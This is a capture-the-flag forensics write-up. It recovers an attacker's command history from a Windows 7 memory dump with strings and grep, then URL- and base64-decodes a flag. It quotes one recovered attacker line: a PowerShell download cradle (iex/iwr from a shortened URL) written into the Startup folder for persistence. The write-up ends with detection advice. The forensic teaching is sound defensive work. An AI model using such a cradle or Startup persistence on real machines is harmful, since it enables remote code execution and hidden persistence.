## Overview

**Export** is an Easy Forensics challenge built around a single 512 MB Windows 7 SP1 x64 memory dump (`WIN-LQS146OE2S1-20201027-142607.raw`). The brief: a suspicious connection was spotted, a memory image was captured, and we need to work out what the attacker did. The intended path is to recover the attacker's `cmd.exe` command history — but Volatility 3 can't build symbols for this legacy image offline, so we fall back to carving the console buffer straight out of RAM with `strings`. The recovered command is a PowerShell download-cradle persisted into the Startup folder, and the flag is hidden, double-encoded, inside the URL it references.

## The technique

Two ideas carry the whole solve:

1. **Console command history is plaintext in memory.** The data the classic Volatility 2 `cmdscan`/`consoles` plugins recover — what was typed at `cmd.exe` — lives in the `conhost`/`csrss` heap as plain UTF-8 text. Recovering it does **not** require kernel symbols, so when your forensics tool can't parse the image, `strings | grep` retrieves the same content.

2. **Attackers double-encode payloads to look benign.** The recovered command writes a PowerShell cradle to the Startup folder for persistence, and the URL it pulls is URL-encoded; the path component of that URL is itself base64 — and base64-decoding it yields the flag. No malware analysis, no network fetch — just reversing two layers of encoding.

## Solution

Volatility 3 (2.28) couldn't even identify the OS — every plugin died the same way:

```bash
vol -f WIN-LQS146OE2S1-20201027-142607.raw windows.info
# Unsatisfied requirement plugins.Info.kernel.symbol_table_name
```

Volatility builds its model of a Windows image from PDB symbol tables; for old Win7 images those often aren't bundled and need a network download. The PDB scan finished and matched nothing, so `windows.info`, `windows.cmdline` and `windows.cmdscan` were all unusable.

Since cmd history is plaintext, carve it directly:

```bash
strings -n 6 WIN-LQS146OE2S1-20201027-142607.raw | grep -aiE 'iex|iwr|powershell|Startup|http'
```

That surfaces the attacker's command — a PowerShell download-cradle written into the Startup folder for persistence:

```text
echo iex(iwr "http%3A%2F%2Fbit.ly%2F<base64>%3D.ps1") > C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\3usy12fv.ps1
```

The flag is encoded inside that URL. The full, commented solver that carves and decodes it:

Create `solve.py`:

```python
import re, base64, subprocess, urllib.parse
RAW = "WIN-LQS146OE2S1-20201027-142607.raw"
out = subprocess.run(["strings", "-n", "6", RAW], capture_output=True, text=True).stdout
line = next(l for l in out.splitlines() if "iex(iwr" in l and "bit.ly" in l)
url = urllib.parse.unquote(re.search(r'http%3A[^"\)]+', line).group(0))
slug = re.search(r'bit\.ly/([^.]+)\.ps1', url).group(1)
print(base64.b64decode(slug).decode())
```

```bash
python3 solve.py
# HTB{...}
```

The two decode steps the script performs:

1. **URL-decode** `http%3A%2F%2Fbit.ly%2F...` → `http://bit.ly/<base64>.ps1`
2. **base64-decode** the bit.ly slug before `.ps1` → the flag

There's no need to actually visit the shortlink — its path component *was* the flag.

## Why it worked

RAM keeps the console command history in cleartext regardless of whether the analyst's tooling can parse the kernel structures, so a symbol-resolution failure in Volatility 3 doesn't block recovery — `strings`/`grep` reads the same `cmdscan` data. The challenge then leans on a real attacker habit: wrapping a payload in URL-encoding plus base64 so it reads as an innocuous link, when in fact the encoded blob is trivially reversible and, here, simply *is* the secret.

## Fix / defense

- Block and monitor PowerShell download-cradles (`iwr`/`iex`) and writes into per-user Startup folders — PowerShell ScriptBlock logging (Event ID 4104) and a Sysmon `FileCreate` rule on `\Start Menu\Programs\Startup\` both catch this.
- Egress-filter workstations so they can't pull arbitrary `.ps1` payloads from URL shorteners.
- Treat a download-cradle persisted to Startup as a high-severity persistence indicator, not noise.
